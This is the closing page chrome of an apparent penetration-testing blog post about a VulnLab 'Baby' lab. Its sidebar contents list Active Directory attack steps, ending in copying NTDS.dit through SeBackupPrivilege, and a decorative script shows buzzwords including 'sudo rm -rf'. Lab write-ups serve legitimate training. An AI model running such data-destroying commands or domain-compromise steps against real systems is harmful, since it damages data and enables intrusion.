</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://dan-feliciano.com">Daniel Feliciano</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://dan-feliciano.com/2024/06/04/baby-vl/">http://dan-feliciano.com/2024/06/04/baby-vl/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Easy/">Easy</a><a class="post-meta__tags" href="/tags/vulnlab/">vulnlab</a></div><div class="post_share"><div class="social-share" data-image="/images/vulnlab/baby-vl/baby_slide.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/06/04/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Hello World</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/cyber.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Daniel Feliciano</div><div class="author-info__description">Certified Red Team Operator</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/DaZ-CYBER" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/daniel-feliciano-412921224/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://www.instagram.com/_danny_feli_/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #cd486b;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is a website where I post my writeups from Vulnlab & HTB, along with exploit research!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration"><span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LDAP-Enumeration"><span class="toc-text">LDAP Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Password-Reset-with-SMBPasswd"><span class="toc-text">Password Reset with SMBPasswd</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation-w-SeBackupPrivilege"><span class="toc-text">Privilege Escalation w&#x2F; SeBackupPrivilege</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Diskshadow-Robocopy-for-NTDS-dit"><span class="toc-text">Diskshadow&#x2F;Robocopy for NTDS.dit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/06/04/baby-vl/" title="Baby - VulnLab"><img src="/images/vulnlab/baby-vl/baby_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Baby - VulnLab"/></a><div class="content"><a class="title" href="/2024/06/04/baby-vl/" title="Baby - VulnLab">Baby - VulnLab</a><time datetime="2024-06-04T19:43:29.000Z" title="Created 2024-06-04 15:43:29">2024-06-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/04/hello-world/" title="Hello World">Hello World</a><time datetime="2024-06-04T17:09:04.125Z" title="Created 2024-06-04 13:09:04">2024-06-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Daniel Feliciano</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hello, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">website</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="getsystem,sudo rm -rf,root,administrator,havoc,sliver,cobalt strike,python,c#,daz,empire,( ͡° ͜ʖ ͡°)" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>